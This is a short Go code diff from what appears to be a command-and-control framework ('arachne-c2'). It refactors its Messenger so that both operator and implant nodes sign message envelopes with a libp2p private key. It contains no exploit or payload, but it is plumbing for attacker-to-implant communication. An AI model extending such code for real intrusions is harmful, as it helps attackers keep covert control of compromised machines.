@@ -8,6 +8,8 @@ import (
 
 	"google.golang.org/protobuf/proto"
 
+	"github.com/libp2p/go-libp2p/core/crypto"
+
 	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
 	"github.com/anomalyco/arachne-c2/pkg/cryptography"
 )
@@ -17,20 +19,21 @@ type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, from
 type Messenger struct {
 	node    *Node
 	handler MessageHandler
-	keys    *cryptography.OperatorKey
+	privKey crypto.PrivKey
 	mu      sync.RWMutex
 }
 
 func NewOperatorMessenger(ctx context.Context, node *Node, keys *cryptography.OperatorKey) *Messenger {
 	return &Messenger{
-		node: node,
-		keys: keys,
+		node:    node,
+		privKey: keys.PrivateKey,
 	}
 }
 
 func NewImplantMessenger(ctx context.Context, node *Node, keys *cryptography.ImplantKey) *Messenger {
 	return &Messenger{
-		node: node,
+		node:    node,
+		privKey: keys.PrivateKey,
 	}
 }
 
@@ -115,14 +118,14 @@ func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachne
 }
 
 func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnepb.Envelope) error {
-	if m.keys != nil {
-		sig, err := cryptography.Sign(m.keys.PrivateKey, env.Data)
+	if m.privKey != nil {
+		sig, err := cryptography.Sign(m.privKey, env.Data)
 		if err != nil {
 			return fmt.Errorf("sign: %w", err)
 		}
 		env.Signature = sig
 
-		pubBytes, err := m.keys.PublicKey.Raw()
+		pubBytes, err := m.privKey.GetPublic().Raw()
 		if err == nil {
 			env.SenderKey = pubBytes
 		}
